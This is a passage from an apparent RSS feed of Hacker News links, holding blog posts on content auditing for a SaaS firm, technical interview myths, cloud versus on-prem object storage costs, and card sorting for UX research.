wasn’t generating more conversions than the beginner topics.&nbsp;</p><p><img alt="Knowledge level Page views" src="https://images.ctfassets.net/wqg266fbc5en/4NejtEO10gO3iqvf10nYPx/5d3fa62b4f6c168be87ea42994549623/Knowledge_level__Page_views.png"><img alt="Knowledge level Conversions" src="https://images.ctfassets.net/wqg266fbc5en/3dUkdUyCmiYCJbeRq7q12R/3c1ac8b5c517e4862a0c5b9b36fa4719/Knowledge_level__Conversions.png"></p><p>This SaaS product is doing some smart things with AI, so it’s very likely that the users consuming the advanced pieces of content are the ones interested in learning how to solve the problem on their own, without the product.&nbsp;</p><p>We wanted to see if this hypothesis was true, so the next step was to look at the <i>target personas</i> and how it related to page views and conversions.&nbsp;</p><p>We saw that the content written for anyone interested in learning about digital marketing was generating a lot of page views, while the pages targeting potential buyers were, again, responsible for around 20% of the page views.&nbsp;</p><p>However, the conversion numbers were much higher for the highly specific content. </p><p><img alt="Persona Page views" src="https://images.ctfassets.net/wqg266fbc5en/6DExXq1ESFsWpFhsiS4xdl/fc1cc1c74ec2a3b7f4800699e81eb7cb/Persona__Page_views.png"><img alt="Persona Conversions (1)" src="https://images.ctfassets.net/wqg266fbc5en/6PzpCGr3CZVrXC0PAmJXSG/7cfb44b62182c45a3016422b003b3105/Persona__Conversions__1_.png"></p><p>As we didn’t have any data about the company size or job title of these users, it was hard to say who exactly was consuming the content. But we did know that the content pieces focused on the pain points and needs of potential buyers were converting better.</p><p>So the last step was to put these findings together and decide on some action points for this SaaS company.&nbsp;</p><h2>Conclusions: should you worry about funnels, search intent and target&nbsp;personas?&nbsp;</h2><p>This SaaS company is not a unique case. Although they’re only 3 years old, they’ve created a huge amount of content, and unfortunately, most of it was published without any strategy in place.&nbsp;</p><p>They focused a lot on top of the funnel content, in an attempt to educate the market and to position themselves as an authority in the field. The result, though, is quite the opposite: they're a good source of digital marketing information for beginners, but they're not exactly the go-to resource for their main areas of expertise. </p><p>The <a href="https://www.schoolofcontent.net/content-audit/">content audit</a> helped them see that:</p><ul><li><p>Most of their content targets broad marketing terms, is written for beginners, and it’s generally <a href="https://www.schoolofcontent.net/blog/generate-leads-uneducated-market">directed to those who just want to learn about marketing</a>.&nbsp;</p></li></ul><p><img alt="Count of Target persona" src="https://images.ctfassets.net/wqg266fbc5en/5KXzxQwPtKYTdTotGMTUtl/9ad999d2ef7940bc90a9647d7cf0f74a/Count_of_Target_persona.png"><img alt="Count of Knowledge level" src="https://images.ctfassets.net/wqg266fbc5en/2Tsm1t7C1FtYQqFLiTK1HW/3760b7e570d8e0bdfea8b61aff2fd98b/Count_of_Knowledge_level.png"><img alt="Count of Funnel stage" src="https://images.ctfassets.net/wqg266fbc5en/4BbHQCGgRwsLfKE0BFnQuO/4e31269acc7fd1050191114dfd0537e4/Count_of_Funnel_stage.png"></p><p>This content gets a lot of traffic but the conversions are poor. If this company wants to improve their conversion rates, they need to audit this content further, look at ways to <a href="https://www.schoolofcontent.net/blog/process-optimize-existing-content">optimize it for the right knowledge level and persona</a>, and then distribute it in relevant channels.</p><p>For example, if we look at the average time on page, we see that the beginner and advanced content is consumed for 4–5 minutes on average, while the intermediate one has an average time on page of 3 minutes.&nbsp;</p><p>The top and middle of the funnel do better from this point of view, but if we look at the topics, we notice that content that’s related to the product has longer read times.&nbsp;To get some more actionable insights here, let’s analyze also the search intent and how it relates to the reading time.&nbsp;</p><p><img alt="Funnel Avg. time on page" src="https://images.ctfassets.net/wqg266fbc5en/20Uuy6gVAa91TS3crqzRcA/23d78f5eb160263145e11df67cd085dc/Funnel__Avg._time_on_page.png"><img alt="Knowledge level Time on page" src="https://images.ctfassets.net/wqg266fbc5en/7ittCh3cTAVwlUagpgckTr/b7ca7c8412e578bd58e297f242036276/Knowledge_level__Time_on_page.png"></p><p>We notice that pages with commercial intent such as pricing pages, service- and product-related content, as well as content with learning intent — how the product works, case studies — have lower time on page.&nbsp;</p><p><img alt="Search intent Avg. time on page" src="https://images.ctfassets.net/wqg266fbc5en/4hS2OnMZNV8m4A9VK2BPGt/41dae21019c984e14458e838c7595732/Search_intent__Avg._time_on_page.png"></p><p>Still, we know that the conversions for these content types are better, so in this case we might conclude that longer content doesn’t necessarily help this company get more clients, although it does attract more readers.</p><p><img alt="Topics Time on page vs conversions" src="https://images.ctfassets.net/wqg266fbc5en/3l9S7Pbzu7hHnGNbE2qtmC/7dc6b1c360b86d1e2ea9e195c5a8334b/Topics__Time_on_page_vs_conversions.png"><img alt="Knowledge level Time on page vs conversions" src="https://images.ctfassets.net/wqg266fbc5en/5tGqzkYfhYohF099BdjAZJ/86dd233a9a5d12698c1f2349d91b42aa/Knowledge_level__Time_on_page_vs_conversions.png"></p><ul><li><p>The highly specialized content that teaches users how to perform certain operations doesn’t get that many views and is not converting well, so this type of content should be abandoned.&nbsp;</p></li><li><p>An alternative is to turn the advanced content into webinars and promote it to companies who have the end user in their marketing or analytics team. This would ensure that the end users gain knowledge and learn how to do things directly from this company, therefore using this company’s product.&nbsp;</p></li><li><p>Finally, we know that the content that performs better in terms of conversions is at the middle and bottom of the funnel, targets topics that are related or strongly related to the product, and is written for an audience with intermediate knowledge.</p></li></ul><p><img alt="Knowledge level Conversions 1" src="https://images.ctfassets.net/wqg266fbc5en/1oOss0934ZJVYk1YByvbmJ/eb81aa0e8149c3cfe1768851eaa5f515/Knowledge_level__Conversions__1_.png"></p><p>This audit helped the company in deciding what content to optimize and what pages to retire.&nbsp;</p><p>The next step for them is to analyze the structure, quality and CTAs of the poorly performing content in order to decide how to optimize the pages. Some pieces might require just a change of angle, while others might be too broad and off-topic to be worth the effort.&nbsp;</p><p>I hope this gives you a bit of direction and shows you how to approach a content audit if you feel that your content isn’t performing well enough.&nbsp;This particular company had 779 pieces of content published, but if you have above 1000 pages published, you might want to start with a smaller scope when auditing the content. </p><blockquote><p>Feel free to <a href="https://www.schoolofcontent.net/contact/">get in touch with our team</a> if you have questions or need help with conducting a similar content audit!</p></blockquote></div></div>]]>
            </description>
            <link>https://www.schoolofcontent.net/case-studies/saas-content-strategy-should-you-build-funnel-educate-users-case-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-25017277</guid>
            <pubDate>Sat, 07 Nov 2020 18:38:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Technical Interview Myths]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25017236">thread link</a>) | @ochronus
<br/>
November 7, 2020 | https://ochronus.online/technical-interview-myths/ | <a href="https://web.archive.org/web/*/https://ochronus.online/technical-interview-myths/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>There are tons of interview myths floating around about the technical hiring process, mostly because it’s usually a black box to candidates. The inherent stress, inexperienced interviewers, tiring challenges, and unresponsive companies are valid reasons for candidates to have a negative view of hiring. Some of these myths work against a good interview experience and the candidates’ chances to get hired, so I’d like to call them out and refute them.</p><h2 id="about-me" data-toc-exclude="">About me <a href="#about-me"></a></h2><p>I’ve interviewed a few hundred software engineering candidates in the past 10+ years and designed hiring processes. I’ve been supporting software engineers for 6+ years, working with ~40 engineers as their engineering manager. My experience is limited to startups and mid-sized companies, so take everything you read here with that in mind.</p><h2 id="now-let%E2%80%99s-see-the-myths-and-misconceptions.">Now let’s see the myths and misconceptions. <a href="#now-let%E2%80%99s-see-the-myths-and-misconceptions."></a></h2><h3 id="you-can-never-be-late.">You can never be late. <a href="#you-can-never-be-late."></a></h3><p>Without question, do you best to be at your interview on time and plan things accordingly, but don’t worry, we know sh*it happens. If you can please let us know you’ll be late or you’d like to reschedule the interview, I promise you it’ll be fine. Nobody in their right mind would try to relate whether you were punctual or not on a single occasion to your future job performance.</p><h3 id="don%E2%80%99t-do-research-ahead-of-time-because-the-interviewer-will-tell-you-everything-you-need-to-know.">Don’t do research ahead of time because the interviewer will tell you everything you need to know. <a href="#don%E2%80%99t-do-research-ahead-of-time-because-the-interviewer-will-tell-you-everything-you-need-to-know."></a></h3><p>False, for two reasons. While your interviewer will do their best to give you all the information <em>they</em> think is essential for you, there’s no way of exactly knowing what that is! The other reason is that if you don’t know anything about the company and the role, you’ll seem like someone who doesn’t care where they work and what they do. You probably don’t want that. You don’t need to overdo it and spend hours looking up who the founders’ grandparents were. Just make sure you understand the company’s market, look at the product(s) we offer (if you have time and you’re interested, even try them - we all love feedback!), and read the job description.</p><h3 id="they-are-looking-for-the-perfect-candidate.">They are looking for the perfect candidate. <a href="#they-are-looking-for-the-perfect-candidate."></a></h3><p>No, we aren’t. We’re looking for a reasonably competent candidate with the right mindset who’s willing to take this journey of constant growth with us.</p><h3 id="it%E2%80%99s-not-ok-to-send-a-follow-up-email-after-my-interview.">It’s not OK to send a follow-up email after my interview. <a href="#it%E2%80%99s-not-ok-to-send-a-follow-up-email-after-my-interview."></a></h3><p>Sure it is! I even tell candidates explicitly to feel free to reach out to me if they have further questions or feedback! I really do value when folks reach out. I don’t mean “thank you” emails, but actual questions or feedback. Please, no brown-nosing, though - that’s really awkward for both of us and won’t get you anywhere.</p><h3 id="they-make-candidates-wait-a-lot-so-they-can-weigh-them-against-each-other.">They make candidates wait a lot so they can weigh them against each other. <a href="#they-make-candidates-wait-a-lot-so-they-can-weigh-them-against-each-other."></a></h3><p>Hell, no we don’t! One quality of a good hiring process is that it should be able to help us decide whether we want to hire that specific candidate independently of others or not. As a hiring manager, I always do the interviews with my mind being set on that if we’re a good match, an offer is going out (unless, of course, headcounts changed in the meantime, but then we communicate that). If you’re waiting too long for us to come back to you, please, by all means, ping us! We might have dropped the ball somewhere – maybe someone is out sick and didn’t have time to ask others to help out, or we simply forgot something. It happens and we’re sorry – don’t assume malice, ask us, please. We should be proactively telling you when you can expect to hear from us and about the next steps, by the way! We do our best to keep those promises.</p><h3 id="recruiters-ghost-me-because-i-performed-badly-in-the-interview.">Recruiters ghost me because I performed badly in the interview. <a href="#recruiters-ghost-me-because-i-performed-badly-in-the-interview."></a></h3><p>While I can’t speak on behalf of all recruiters, in my experience, this is not the case! It should not happen. Sure, mistakes happen (recruiters are, believe it or not, humans, too), but the norm is that you get a timely answer whatever the interview outcome was. If you’re not getting that, ping them. Or ping the hiring manager. Probably someone dropped the ball on something. It happens. Ideally, we should be telling you when to expect us to come back to you, so you can know if we’re late or you’re just impatient ;) - if you’re not getting that information from us, just ask at the end of the interview.</p><h3 id="if-my-interviewer-is-having-a-bad-day%2C-i-will-probably-fail-the-interview.">If my interviewer is having a bad day, I will probably fail the interview. <a href="#if-my-interviewer-is-having-a-bad-day%2C-i-will-probably-fail-the-interview."></a></h3><p>Hopefully not. Sure, we are all humans, and our mood influences how we think and act, but a well-designed hiring process should protect against this. Unless I’m actively malicious (and why would I be?! I WANT to hire engineers!), my bias will be called out by other interviewers in the same step or another step, and I’ll need to argue for not hiring you. Honestly, even a good scorecard (the thing we fill out with some standard, guiding questions after the interview) will make me realize I’m just in a bad mood and then I can deal with it. If you only meet 1-2 interviewers during your process, the risk of bias is much higher. While you have no control over who interviews you, you can take a hint from this. While the scene might not yet be 100% rosy, companies are trying their best to stay competitive in the job market, and more and more realize that structured, unbiased, and humane interviews are one key to this.</p><h3 id="smaller-companies-blindly-copy-faang-hiring-methods.">Smaller companies blindly copy FAANG hiring methods. <a href="#smaller-companies-blindly-copy-faang-hiring-methods."></a></h3><p>Facebook, Amazon, Apple, Netflix, Google have some (in)famous hiring methods. While some companies probably blindly copy those, most don’t. It’d be stupid. They play on a different field with different goals and have a much higher volume of candidate influx. One example is focusing on algorithm and data structure knowledge – most FAANG technical interviews test this. It probably makes sense for them while it doesn’t make much sense for most other companies. Not only that, but it can have a negative effect (other than scaring away good candidates) – being biased towards two kinds of applicants: engineers who are working a lot with algorithms and data structures and fresh graduates, who still have muscle memory of this.</p><h3 id="culture-fit-%3D%3D-we-want-people-exactly-like-us.">Culture fit == we want people exactly like us. <a href="#culture-fit-%3D%3D-we-want-people-exactly-like-us."></a></h3><p>When we say “cultural fit”, we mean “value/principle fit”. I try to say that, by default, but industry terms die hard. We’re looking for teammates who believe in most of the same basic principles as we do, that’s all. Some examples of these principles are (for us, here at Contentful): transparency, growth mindset, customer focus and teamwork. I can reason why these are important and how they also relate to job performance and how they lead to a happy and scalable organization. It’s not fluffy stuff.</p><h3 id="my-resume-is-really-important.">My resume is really important. <a href="#my-resume-is-really-important."></a></h3><p>Yes and no – yes, to get your foot in the door. It’s also a conversation starter but I’ll be interested in your stories instead when we talk. I look at resumes of candidates already in the loop only to find more information about them – things to talk about, to get some context. One thing about your resume though – it is also a piece of work from you, a signal for me. If it is seriously lacking in some aspect (eg it has serious spelling mistakes), I may see it as a sign of you not paying attention to your work’s quality or not asking for feedback (for someone to review it). By the way, there’s an excellent new book from Gergely Orosz in town about engineering resumes that can help you stand out to the next recruiter or hiring manager – <a href="https://thetechresume.com/">The Tech Resume Inside Out</a>. If you don’t have too much time for this, just update your LinkedIn profile (a good move anyway!) and export your CV from LinkedIn – it is going to be much better than if you try to put it together in one evening alone.</p><h3 id="telling-the-recruiter-i%E2%80%99m-also-in-the-process-elsewhere-is-a-bad-move.">Telling the recruiter I’m also in the process elsewhere is a bad move. <a href="#telling-the-recruiter-i%E2%80%99m-also-in-the-process-elsewhere-is-a-bad-move."></a></h3><p>You might think we’ll feel you’re not dedicated to us – but why would you be?! We just started talking 🙂 Nobody’s expecting you to focus on one company! On the other hand, if we really like you and you signal urgency we’ll have the chance to speed things up or even be more generous with our offer to convince you to join us 😉</p><hr><h2 id="some-truths-about-the-technical-interview">Some truths about the technical interview <a href="#some-truths-about-the-technical-interview"></a></h2><h3 id="your-interviewer-is-also-stressed-and-they-want-to-do-a-good-job.">Your interviewer is also stressed and they want to do a good job. <a href="#your-interviewer-is-also-stressed-and-they-want-to-do-a-good-job."></a></h3><p>Yup, after a few hundred interview sessions I still practice conversations in my head, I still worry I’ll make a bad impression and that I’ll mess things up. Many other people you will meet are doing much fewer interviews than me. I’m representing both myself and my company in each and every interview. I feel personally responsible for providing a good experience for you and I want you to remember the interview as “Well that was surprisingly good!”.</p><h3 id="not-getting-hired-is-not-a-failure.">Not getting hired is not a failure. <a href="#not-getting-hired-is-not-a-failure."></a></h3><p>Nobody in the hiring process will think of you like that! Trust me on this one. And yes, please do try again! The fact that you made it to the Nth step this time means that we see potential in you. If you reach out I’m more than happy to give tips and advice on where and how to grow.</p><h3 id="we-are-matchmakers%2C-not-judges.">We are matchmakers, not judges. <a href="#we-are-matchmakers%2C-not-judges."></a></h3><p>My goal is to find a good match between the role I’m hiring for and the candidate applying. This truly goes both ways. I do my best to make sure the candidate would be successful and happy if we hired them.</p><hr><p>How many of the points above do you belive are true? Are you relieved after reading my points or do you think I'm just bullsh*tting? Did I miss anything? I'd love some feedback - hit me up on <a href="https://twitter.com/ochronus">Twitter</a> or just drop an email to <a href="mailto:blog@ochronus.online">blog@ochronus.online</a>.</p></section><p>Since you've made it this far, <a href="https://ochronus.online/technical-interview-myths/" on-click="share">sharing</a> this article on your favorite social media network would be highly appreciated 💖! For feedback, please <a href="https://twitter.com/ochronus" target="_blank" rel="noopener">ping me on Twitter.</a></p></div>]]>
            </description>
            <link>https://ochronus.online/technical-interview-myths/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25017236</guid>
            <pubDate>Sat, 07 Nov 2020 18:35:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The long term costs of object storage in the public cloud]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25017088">thread link</a>) | @jtsymonds
<br/>
November 7, 2020 | https://blog.min.io/the-long-term-costs-of-storage-in-the-cloud/ | <a href="https://web.archive.org/web/*/https://blog.min.io/the-long-term-costs-of-storage-in-the-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>The promise/allure of the public cloud is based on the concept that it is elastic. One can, with little effort, scale up workloads and, if desired, scale down those same workloads. We have <a href="https://blog.min.io/repatriation_wave/">written on this subject before</a> - from the perspective of what workloads to consider as you evaluate what to take to the public cloud and what to repatriate to the private cloud. <br></p><p>We have not, however, taken a hard look at the costs associated with the two options. Our position can be related as an analogy. The public cloud is like a nice hotel. Plenty of amenities, secure, spacious etc. It is priced like a nice hotel too. As a result, people don’t live in nice hotels - they stay there for a period of time to achieve a certain objective (business trip, vacation) because it gets too expensive otherwise. <br></p><div><p>We wanted to quantify this objectively so we rolled up our sleeves, made some reasonable assumptions and wrote this post. Here we go:</p><p>If we assume that we will be using object storage in the cloud and want to understand the costs of deploying a PB of data (200TB active, 800TB inactive, with a Read:Write ratio of 80:20) we can compute what this storage would cost on various public clouds.</p></div><p>AWS S3 storage tiers costs are as follows (See <a href="https://aws.amazon.com/s3/pricing/">https://aws.amazon.com/s3/pricing/</a>). This should not be a surprise as prices have not changed in the last four years (but costs have :).<br></p><ul><li><strong>S3 Standard</strong> storage the first 50TB costs $0.023 per month per GB, the next 450TB costs $0.22 per month per GB, and all storage over 500TB costs $0.021 per month per GB. So 1PB of S3 Standard storage would cost $1.2K/month for the 1st 50TB, $9.9K/month for the next 450 TB and $10.3K/month for the next 500TB or <strong>$21.6K/month for 1PB of data</strong>.</li><li><strong>S3 Intelligent Tiering </strong>storage costs the same as S3 Standard for frequently active data and $0.0125 for infrequently accessed data plus an $0.0025 per 1000 Objects fee for management. So assuming 200TB:800TB active:inactive the active data would cost $1.2K/month for 50TB and $3.3K/month for the 150TB and $10.0K for the inactive 800TB. To that, we must add object management costs. It’s not unusual to see PB data warehouse with billions of objects/files. So if we assume 1B objects (average ~1MB/object) in our PB of data object management costs would be $2.5K per month. Totaling all that together we have an overall <strong>storage and object management costs of</strong> ~<strong>$17.0K per month for our 1PB of data</strong>. <br></li></ul><p>It is true one could do a blend of standard S3 plus S3 Glacier or S3 Glacier Deep Archive, but that doesn’t really get to the apples to apples comparison we are seeking. So for the purposes of this we will consider the first two. <br></p><p>Although Azure and GCP don’t have exactly equivalent tiers of storage, if we just focus on S3 Standard equivalents then Azure Blob and GCP cloud storage costs are:</p><ul><li>Azure (Hot) Blob storage <a href="https://azure.microsoft.com/en-us/pricing/details/storage/blobs/">costs</a> a flat $0.0184 per GB per month or $18.4K per 1PB per month, or about 85% of AWS S3 standard costs.</li><li>GCP us-central cloud storage costs are $0.020 per GB per month or $20K for 1PB per month or about 93% of what AWS S3 standard costs. <br></li></ul><p>There are some additional costs that are associated with per 1,000 S3 operations. But we estimate in the scheme of things they don’t add more than $300/month to the above costs. As such we will ignore these costs here.</p><h3 id="what-if-we-wanted-to-copy-the-data-out-of-the-cloud">What if we wanted to copy the data out of the cloud?</h3><p>Of course none of the above cloud storage costs takes into consideration any egress charges which for AWS and GCP are $0.09 to $0.05/GB per month and $0.12/GB, respectively. So if you wanted to move the active 200TB of your 1PB of data out of the (AWS or GCP) cloud each month you would need to add it would cost you another ~$14K/month (on average) with AWS S3 and $24K/month with GCP. <br></p><p>For Azure they don’t appear to have a standard egress charge but rather charge per operation and bandwidth used. We would guess (although we haven’t verified this) that the costs would be comparable to AWS S3 standard egress charges. <br></p><p>Of course there would be no direct charge to move the 1PB of data center data around. You would incur bandwidth costs depending on where you moved it. But the server costs are already accounted for in the costs above. <br></p><h3 id="the-private-cloud-onprem-equivalents-software">The Private Cloud/OnPrem Equivalents: Software</h3><p>First off, you need equivalent software. MinIO offers that (and more) with its S3 compatible, feature rich object storage suite. It is literally a private cloud, drop-in equivalent for AWS. While MinIO is open source, it does offer two tiers for the MinIO Subscription Network. SUBNET, as we call it, combines a commercial license with 24/7/365 direct-to-engineer support, security and resilience audits and other diagnostic technologies that effectively insure production deployments of our software. <br></p><p>The Standard tier is priced at .01 per GB per month and the Enterprise tier is priced at .02 per GB per month.<br></p><p>For our PB of data, that equates to 10K and 20K per month respectively. Needless to say, there is the open source option as well, which would be appropriate if your data was not mission critical. That cost is zero.</p><p>There are no egress costs. There are no per object management costs. <br></p><p>For the purposes of this exercise let’s choose the middle - the Standard plan at <strong>$10K per month for software costs.</strong></p><h3 id="the-private-cloud-onprem-equivalents-hardware">The Private Cloud/OnPrem Equivalents: Hardware</h3><p>While MinIO can run on a range of hardware from Raspberry Pis to IBM Power, we wanted to target dense JBODs for the purposes of our analysis. <br></p><p>It just so happens that through our partnership with Seagate, we have publishable pricing for a 1TB configuration of the Exos AP 2U12 (Dual AP) with two Intel Silver Xeon CPUs. It has</p><p>60 drives at 16 TB per drive delivering .96 PB raw capacity and .72 actual capacity. This assumes erasure coding factor of .75. The price for that hardware is a very reasonable $70K. Let’s choose a three year amortization schedule on that hardware to determine a monthly per GB cost. At 36 months our monthly cost for the hardware works out<strong> to $1,510 per month or $0.0015 GB/month</strong>. <br></p><p>Interested in more? Jump over to the <a href="https://min.io/product/reference-hardware#pricing-calculator">Reference Hardware page to play with the calculator</a> to see other capacities. <br></p><h3 id="don-t-forget-the-data-center-costs">Don’t Forget the Data Center Costs</h3><p>For a data center deployment, we would need to add administration, rack, space, power and cooling costs. We could go into great detail here to determine each of these costs but in general according to the US Chamber of Commerce <a href="https://www.uschamber.com/sites/default/files/ctec_datacenterrpt_lowres.pdf">data center space</a> can be had for about $1305/NRSF (net rentable square feet) in CapEx and another $112/NRSF ( ~8.6% of CapEx) in OpEx or a total of ~$1.4K/NRSF annual cost or an extra $116 per month. <br></p><h3 id="totaling-up-the-private-cloud">Totaling Up the Private Cloud</h3><p>The cost to run your own, 1 PB private cloud, with state of the art hardware, 24/7 direct-to-engineer support, panic button access and annual performance reviews is <strong>$11,510 per month</strong>. Let’s circle back and compare that to what we calculated above.</p><h3 id="summarizing-the-one-year-costs">Summarizing the One Year Costs</h3><p>At $11,510 MinIO and Seagate represent the best economics - by a considerable amount. The combination is 47% less expensive per month than standard S3 and 33% less than S3 with Intelligent Tiering. <br></p><p>These calculations ignore AWS egress costs - which would make MinIO and Seagate less than half as expensive as Standard S3. <br></p><p>MinIO and Seagate are also 38% less than Azure’s comparable option and 43% less than Google Cloud Platform’s comparable offering. <br></p><p>The breakeven point for building your own private cloud vs. S3 Standard comes in at seven months. Thought of another way - for the price of 1PB on S3 Standard you could have almost 1.5 PBs of MinIO and Seagate.</p><p><br>The overall point is not to compete on price. </p><p>We think it is a <a href="https://blog.min.io/the-new-metrics-of-object-storage/">poor metric</a> when thinking about object storage. What we seek to detail here, is that, over time, you will get better performance, superior security, more control and additional flexibility by going on prem - without sacrificing anything on cost (indeed you gain economic advantage). That is why many innovative enterprises are engaged in large scale repatriation strategies, because they realize the cloud is here to stay and they have a choice about what cloud that is - and they are picking the private cloud.</p><p>Feel free to disagree with us. You can reach out at hello@min.io. </p><p>Feel free also to put us to the test. &nbsp;You can contact a Seagate rep from the <a href="https://min.io/product/reference-hardware#pricing-calculator">calculator</a> and <a href="https://min.io/download#/macos">download our software here</a>. If you need a little help, join the 9,700 members of the Slack channel. </p>

                                    </section></div>]]>
            </description>
            <link>https://blog.min.io/the-long-term-costs-of-storage-in-the-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25017088</guid>
            <pubDate>Sat, 07 Nov 2020 18:21:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Card Sorting 101: Card Sorting Basics]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25016973">thread link</a>) | @NwUX
<br/>
November 7, 2020 | https://blog.uxtweak.com/card-sorting-101/ | <a href="https://web.archive.org/web/*/https://blog.uxtweak.com/card-sorting-101/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>

            This guide will help you to understand the basics of card sorting. Answer questions: What is card sorting? What different types there are, and when to use them? What can you learn with card sorting?
          </p><div>
            <p><span>If your goal isn’t to confuse your user and drive them mad, the content on your website must be organized following user expectations. To learn what those expectations are and gain an understanding of how your website’s users think, you can use card sorting.</span></p>
<h2><span>What is card sorting?</span></h2>
<p><b>Card sorting or card sort is a research method allowing researchers to figure out how people conceptualize and categorize the information found on your website. </b><span>In simple terms – it lets you find out how to group and label your content, so it makes sense to your users.</span></p>
<h3><span>Why should you care?</span></h3>
<p><span>The collected insights will help you with labeling and grouping content. With this knowledge, you will be able to build an information architecture where users can find what they’re looking for effectively.</span></p>
<h2><span>When is a good time to use Card Sort?Â&nbsp;</span></h2>
<ul>
<li><b>When you’re creating a new website, a section of a website or you’re trying to improve an already existing one</b></li>
<li><b>When you want to make sure that the information on your website is grouped intuitively and logically for your users</b></li>
<li><b>When you want to find out how people understand certain concepts. To find out whether there are groups of people who understand the same concept differently</b></li>
<li><b>When you want people to divide some items into groups for you</b></li>
</ul>
<p><span>As the name suggests, card sorting involves giving respondents the task to sort a set of cards into categories. </span><b>Each card contains a text label that usually represents a piece of content from your website. You want the respondents to sort these cards according to their own opinion and personal sense.</b></p>
<p><span>Depending on how people can sort cards into categories, </span><b>there are three types of card sort: open, closed, and hybrid.</b></p>
<h2>Types of card sort studies</h2>
<p><span>There are different types of card sorting to use in different scenarios. You can find all of them in the card sorting tool – </span><a href="https://www.uxtweak.com/card-sort-tool"><span>CardSort</span></a><span>.</span></p>
<ol>
<li><b>Open card sorting</b><span> – Respondents sort the cards into categories they created and named. You provide respondents with cards only. If you have never been part of card sorting, you can try it as a respondent in our demo studies. Try</span><a href="https://app.uxtweak.com/cardsort/run/RayOSpxRdAmwcduZuQxB2"><span> Open CardSort</span></a><span> study.</span></li>
<li><b>Closed card sorting – </b><span>Categories are prepared by the researcher Respondents don’t create categories, only fill them with cards. Try </span><a href="https://app.uxtweak.com/cardsort/run/LuSUMGb9IKIdcHnQuFrfo"><span>Closed CardSort</span></a><span> study</span><b>.</b></li>
<li><b>Hybrid card sorting</b><span> – Categories are prepared beforehand by researchers, but respondents can create their own categories if they feel the need. Try </span><a href="https://app.uxtweak.com/cardsort/run/Gj7HsR31JtybjkVGt4eT0"><span>Hybrid CardSort</span></a><span> study.</span></li>
</ol>
<h2><span>Choose the right technique</span></h2>
<p><span>Before you create your first card sorting and you can start using CardSort in your design process, you should first know all three card sorting techniques (open, closed, and hybrid) and demand a different type of mental activity from respondents. Each one requires that respondents look at the content differently.</span></p>
<h3><span>When should you decide on an open card sort?</span></h3>
<p><span>In an open card sort, the groupings that people create show you how people conceptualize the content when they’re not limited by pre-set boundaries.</span></p>
<ul>
<li><b>When you lack knowledge about how people perceive the information on the website.</b></li>
<li><b>When you want to know where on the website users expect certain content to be.</b></li>
<li><b>When you want to get some inspiration for labeling and grouping content on the website.</b></li>
<li><b>When you want to find out if there are different groups of people who understand the content of the website differently and would look for the same content in other places.</b></li>
</ul>
<h3><span>When should I decide on a closed card sort?</span></h3>
<p><span>In a closed card sort, respondents don’t have to think about the groups themselves. Instead, they can focus on how to divide up the cards into the groups that you’ve provided.</span></p>
<ul>
<li><b>When you want to know if people would sort a piece of information into the same category as you would.</b></li>
<li><b>When you want to find out whether your categories are a good representation of their contents, or if they’re ambiguous, confusing and people conceptualize them differently.</b></li>
<li><b>When you have different variants of categories, and you want to decide on which ones to use in your design, depending on how intuitive they are.</b></li>
</ul>
<p><span>Hybrid card sort is a flexible technique of its own that blurs the line between open and closed card sort, loses some of their specializations, but gains its perks, uses, and benefits.</span></p>
<p><b>Each technique is ideal for use under different conditions, and picking the right one is essential for getting the data that is relevant to you.</b><span> If you are looking for more information about this topic, and interested to learn how to analyze the results of all card sorting methods explained with the case study, read our – </span><a href="https://www.uxtweak.com/help/cardsort-guide"><span>The definitive guide to creating effective CardSorts</span></a><span>.</span></p>
<h2><span>Preparing cards and categoriesÂ&nbsp;</span></h2>
<p><span>When it comes to the fate of a card sort study, it all depends on what’s in the cards. How you choose the labels of your cards, as well as how many cards there are in total. In general, </span><b>the ideal number of cards in one card sort is between 30 and 60.</b></p>
<p><span>Here are some additional things to keep in mind when preparing a card sorting study:</span></p>
<ul>
<li><b>Avoid having too few cards so you can collect enough data from the respondents.</b></li>
<li><b>Fewer than 30 cards make it hard for grouping to emerge as fewer cards provide less context for the respondents to form a big picture.</b></li>
<li><b>Having to think about which cards to include in the card sort is a good thing for deciding which of the cards are the most relevant.</b></li>
<li><b>The more cards in your card sort, the more time consuming the card sort, making respondents more likely to abandon your study before they’re finished.</b></li>
</ul>
<h2><span>What can you learn with Card Sort?</span></h2>
<p><span>Card sorting is a very</span> <span>versatile research method.</span> <span>You can use card sort to:</span></p>
<ul>
<li><span>Compare your website structure with how it’s structured in the heads of your usersÂ&nbsp;</span></li>
<li><span>Find out how people group products in your e-shopÂ&nbsp;</span></li>
<li><span>Generate ideas for tagging and categorizing your blog articlesÂ&nbsp;</span></li>
<li><span>Generate ideas for structuring your help centerÂ&nbsp;</span></li>
<li><span>Research what priorities customers assign to selected features, services, or products</span></li>
<li><span>Find out what types of articles your audience is most interestedÂ&nbsp;</span></li>
<li><span>Discover which content of your website is going to most popular</span></li>
<li><span>Research how your customers view your companyÂ&nbsp;</span></li>
<li><span>Get fast feedback on your designs from the team or customersÂ&nbsp;</span></li>
<li><span>Set priorities for features, products, and servicesÂ&nbsp;</span></li>
</ul>
<p><span>And much more – our creativity is the only limitation here.</span></p>
<h2><span>Conclusion</span></h2>
<p><span>Card sorting is an incredibly useful method when it comes to information architecture research. It helps you to understand how users think about the information on your website. Cart Sorting is valuable in helping you to organize content, so it is according to your user’s ideas and expectations rather than your own. To learn more about card sorting, visit our </span><a href="https://www.uxtweak.com/help/cardsort-guide"><span>Definitive guide to effective Card sort</span></a><span>.</span></p>
